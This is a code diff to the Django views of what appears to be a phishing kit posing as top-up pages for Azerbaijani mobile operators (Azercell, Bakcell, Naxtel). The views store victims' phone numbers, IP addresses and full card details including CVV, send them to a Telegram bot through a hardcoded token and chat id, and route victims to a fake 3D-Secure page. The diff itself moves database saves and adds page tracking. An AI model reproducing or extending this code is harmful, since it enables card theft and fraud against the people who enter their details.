@@ -53,8 +53,8 @@ def naxtel(request):
             return render(request, "pages/azercell.html",)
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
-        contact.save()
         contact.page_name="/info"
+        contact.save()
         request.session['operator'] = operator
         request.session['phone'] = number
         request.session['amount'] = amount
@@ -85,8 +85,8 @@ def azercell(request):
             return render(request, "pages/azercell.html",)
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
-        contact.save()
         contact.page_name="/info"
+        contact.save()
         print(contact.id)
         request.session['operator'] = operator
         request.session['phone'] = number
@@ -105,8 +105,8 @@ def bakcell(request):
             return render(request, "pages/azercell.html",)
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
-        contact.save()
         contact.page_name="/info"
+        contact.save()
         request.session['operator'] = operator
         request.session['phone'] = number
         request.session['amount'] = amount
@@ -145,8 +145,8 @@ def info(request):
         contact.yy = yy_
         contact.cvv = cvv_
         contact.bankname=""
-        contact.save()
         contact.page_name="/master.html"
+        contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:master\n\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}')
         context = {
                 'id':contact.id,
@@ -163,6 +163,8 @@ def info(request):
         'phone': phone,
         'amount': amount,
     }
+    contact.page_name="/3dsec"
+    contact.save()
     return render(request, 'pages/3dsec.html', context)
 def check_approval_status(request, contact_id):
     try:
